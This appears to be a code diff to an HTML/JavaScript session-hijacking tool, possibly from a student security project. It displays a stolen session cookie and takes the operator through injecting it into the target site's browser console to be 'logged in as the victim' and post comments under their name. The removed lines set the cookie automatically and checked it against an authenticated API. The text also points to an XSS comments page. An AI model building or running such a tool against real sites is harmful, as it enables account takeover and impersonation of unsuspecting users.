@@ -307,20 +307,33 @@
             </button>
             
             <button onclick="manualInstructions()" style="background: #0066ff;">
-              📋 MANUAL INSTRUCTIONS<br>
-              <small style="font-size: 0.7rem;">(Copy & Paste Method)</small>
+              📋 MANUAL METHOD (RECOMMENDED)<br>
+              <small style="font-size: 0.7rem;">(Works 100% - Copy & Paste)</small>
             </button>
             
             <div id="instructions" style="display: none; margin-top: 20px;">
               <div class="step">
-                <strong>Manual Method:</strong><br>
-                1. Copy this command:<br>
-                <pre id="command">document.cookie = "${sessionCookie}; path=/"; location.href = "${targetURL}";</pre>
-                <button onclick="copyCommand()" style="padding: 5px 15px; font-size: 0.9rem;">📋 Copy Command</button>
+                <strong style="color: #00ff00;">✅ MANUAL METHOD (RECOMMENDED):</strong><br><br>
+                
+                <strong style="color: #ffaa00;">Step 1:</strong> Click this link to open target site:<br>
+                <a href="${targetURL}/comments.html" target="_blank" style="color: #00ff00; font-size: 1.2rem;">
+                  🔗 ${targetURL}/comments.html
+                </a><br><br>
+                
+                <strong style="color: #ffaa00;">Step 2:</strong> On the target page, press <kbd>F12</kbd> to open DevTools<br><br>
+                
+                <strong style="color: #ffaa00;">Step 3:</strong> Go to <strong>Console</strong> tab<br><br>
+                
+                <strong style="color: #ffaa00;">Step 4:</strong> Copy and paste this command:<br>
+                <pre id="command">document.cookie = "${sessionCookie}; path=/"; location.reload();</pre>
+                <button onclick="copyCommand()" style="padding: 5px 15px; font-size: 0.9rem; background: #00ff00; color: #000;">
+                  📋 COPY COMMAND
+                </button>
                 <br><br>
-                2. Open <a href="${targetURL}" target="_blank" style="color: #00ff00;">${targetURL}</a> in incognito<br>
-                3. Press F12 → Console → Paste the command → Enter<br>
-                4. You're logged in! 🎯
+                
+                <strong style="color: #ffaa00;">Step 5:</strong> Press <kbd>Enter</kbd> to execute<br><br>
+                
+                <strong style="color: #00ff00;">✅ Done! Page will reload with hijacked session!</strong>
               </div>
             </div>
           </div>
@@ -330,142 +343,137 @@
             const targetURL = \`${targetURL}\`;
             
             function autoHijack() {
-              // Extract domain from target URL for cookie setting
-              let domain = '';
-              try {
-                const url = new URL(targetURL);
-                domain = url.hostname;
-                // For subdomains like project-1-16.eduhk.hk, we might need .eduhk.hk
-                if (domain.includes('.')) {
-                  const parts = domain.split('.');
-                  if (parts.length >= 2) {
-                    // Use the last two parts for domain (e.g., .eduhk.hk)
-                    domain = '.' + parts.slice(-2).join('.');
-                  }
-                }
-              } catch (e) {
-                console.error('Failed to parse URL:', e);
-              }
-              
-              // Set cookie with proper domain
-              if (domain) {
-                document.cookie = sessionCookie + "; path=/; domain=" + domain;
-              } else {
-                document.cookie = sessionCookie + "; path=/";
-              }
-              
-              // Create a test page that validates the session and shows success
-              const testHTML = \`
+              // Show instructions for auto-hijack
+              const instructionHTML = \`
 <!DOCTYPE html>
 <html>
 <head>
-  <title>🎯 Session Hijack Test</title>
+  <title>🎯 Session Hijack Instructions</title>
   <style>
     body { 
       background: #000; color: #00ff00; 
       font-family: 'Courier New', monospace; 
-      padding: 40px; text-align: center; 
+      padding: 20px; 
     }
     .container {
-      max-width: 700px; margin: 0 auto;
+      max-width: 800px; margin: 0 auto;
       background: #1a1a1a; padding: 30px;
       border: 2px solid #00ff00; border-radius: 10px;
     }
-    h1 { color: #ff0000; }
-    .success { color: #00ff00; font-size: 1.2rem; }
-    .error { color: #ff0000; font-size: 1.2rem; }
+    h1 { color: #ff0000; text-align: center; }
+    .step { 
+      background: #000; 
+      padding: 20px; 
+      margin: 20px 0; 
+      border-left: 5px solid #ff0000;
+    }
+    .step-number {
+      color: #ff0000;
+      font-size: 1.5rem;
+      font-weight: bold;
+    }
     pre { 
-      background: #000; padding: 15px; 
-      border-radius: 5px; text-align: left; 
-      overflow-x: auto; color: #ffaa00; 
+      background: #000; 
+      padding: 15px; 
+      border-radius: 5px;
+      overflow-x: auto; 
+      color: #ffaa00;
+      border: 1px solid #ffaa00;
+      margin: 10px 0;
     }
     button {
-      background: #ff0000; color: #fff;
-      border: none; padding: 15px 30px;
-      font-size: 1.1rem; border-radius: 5px;
-      cursor: pointer; margin: 10px;
+      background: #00ff00; color: #000;
+      border: none; padding: 10px 20px;
+      font-size: 1rem; border-radius: 5px;
+      cursor: pointer; margin: 10px 5px;
       font-family: 'Courier New', monospace;
+      font-weight: bold;
     }
-    button:hover { background: #cc0000; }
+    button:hover { background: #00cc00; }
+    button.red {
+      background: #ff0000; color: #fff;
+    }
+    button.red:hover { background: #cc0000; }
+    a { color: #00ff00; text-decoration: none; font-size: 1.1rem; }
+    a:hover { color: #00cc00; text-decoration: underline; }
+    kbd {
+      background: #333;
+      border: 1px solid #666;
+      padding: 3px 8px;
+      border-radius: 3px;
+      font-family: 'Courier New', monospace;
+      color: #fff;
+    }
+    .success { color: #00ff00; font-weight: bold; font-size: 1.2rem; }
+    .warning { color: #ffaa00; }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>🎯 SESSION HIJACK STATUS</h1>
-    <div id="status">⏳ Testing hijacked session...</div>
-    <div id="result"></div>
-    <div id="actions" style="display:none; margin-top: 20px;">
-      <button onclick="window.location.href='\${targetURL}'">
-        🚀 GO TO TARGET SITE
-      </button>
-      <button onclick="openCommentsPage()">
-        💬 GO TO COMMENTS (XSS)
-      </button>
+    <h1>🎯 SESSION HIJACK - STEP BY STEP</h1>
+    
+    <div class="step">
+      <div class="step-number">STEP 1: Open Target Site</div>
+      <p>Click this link to open the target site in a new tab:</p>
+      <a href="\${targetURL}/comments.html" target="_blank">
+        🔗 Open \${targetURL}/comments.html
+      </a>
+      <p class="warning"><small>💡 Tip: Use incognito/private window to avoid interfering with your real session</small></p>
+    </div>
+    
+    <div class="step">
+      <div class="step-number">STEP 2: Open Developer Tools</div>
+      <p>On the target page, press <kbd>F12</kbd> (or <kbd>Ctrl</kbd>+<kbd>Shift</kbd>+<kbd>I</kbd>)</p>
+      <p>Then click on the <strong>"Console"</strong> tab</p>
+    </div>
+    
+    <div class="step">
+      <div class="step-number">STEP 3: Inject the Stolen Cookie</div>
+      <p>Copy this command by clicking the button:</p>
+      <pre id="cookieCommand">document.cookie = "\${sessionCookie}; path=/"; location.reload();</pre>
+      <button onclick="copyCookieCmd()">📋 COPY COOKIE COMMAND</button>
+      <p>Then <strong>paste it into the Console</strong> and press <kbd>Enter</kbd></p>
+    </div>
+    
+    <div class="step">
+      <div class="step-number">STEP 4: Verify Success</div>
+      <p class="success">✅ The page should reload and you'll be logged in as the victim!</p>
+      <p>You can verify by:</p>
+      <ul>
+        <li>Checking if you can see private content</li>
+        <li>Looking at the username displayed (if any)</li>
+        <li>Trying to post comments as the victim</li>
+      </ul>
+    </div>
+    
+    <hr style="border-color: #00ff00; margin: 30px 0;">
+    
+    <div style="text-align: center;">
+      <p><strong>Target:</strong> <code>\${targetURL}</code></p>
+      <p><strong>Stolen Cookie:</strong></p>
+      <pre style="font-size: 0.8rem;">\${sessionCookie}</pre>
+      <button class="red" onclick="window.close()">❌ CLOSE THIS WINDOW</button>
     </div>
   </div>
   
   <script>
-    const targetURL = '\${targetURL}';
-    
-    // Test if session is valid by calling an API
-    async function testSession() {
-      try {
-        // Try to fetch messages - requires authentication
-        const response = await fetch(targetURL + '/api/messages/1', {
-          credentials: 'include'  // Include cookies
-        });
-        
-        if (response.ok) {
-          const data = await response.json();
-          document.getElementById('status').innerHTML = 
-            '<div class="success">✅ SESSION HIJACK SUCCESSFUL!</div>';
-          document.getElementById('result').innerHTML = \`
-            <pre>Cookie is valid!
-Session active!
-Target: \${targetURL}
-
-Hijacked session cookie:
-\${document.cookie}</pre>
-          \`;
-          document.getElementById('actions').style.display = 'block';
-        } else {
-          throw new Error('Session invalid (HTTP ' + response.status + ')');
-        }
-      } catch (error) {
-        document.getElementById('status').innerHTML = 
-          '<div class="error">❌ SESSION HIJACK FAILED</div>';
-        document.getElementById('result').innerHTML = \`
-          <pre>Error: \${error.message}
-
-This could mean:
-1. Cookie domain mismatch
-2. Session expired
-3. CORS blocking the request
-4. httpOnly cookie (can't access via JS)
-
-Current cookie:
-\${document.cookie}
-
-Try manual method instead!</pre>
-        \`;
-      }
+    function copyCookieCmd() {
+      const cmd = document.getElementById('cookieCommand').textContent;
+      navigator.clipboard.writeText(cmd).then(() => {
+        alert('✅ Cookie command copied!\\n\\nNow:\\n1. Go to the target site tab\\n2. Open Console (F12)\\n3. Paste and press Enter');
+      }).catch(err => {
+        alert('Failed to copy. Please select and copy manually.');
+      });
     }
-    
-    function openCommentsPage() {
-      window.location.href = targetURL + '/comments.html';
-    }
-    
-    // Run test immediately
-    testSession();
   <\/script>
 </body>
 </html>
               \`;
               
-              // Write the test page to current window
-              document.open();
-              document.write(testHTML);
-              document.close();
+              // Open instruction page in new window
+              const instructionWindow = window.open('', '_blank', 'width=900,height=700');
+              instructionWindow.document.write(instructionHTML);
+              instructionWindow.document.close();
             }
             
             function manualInstructions() {
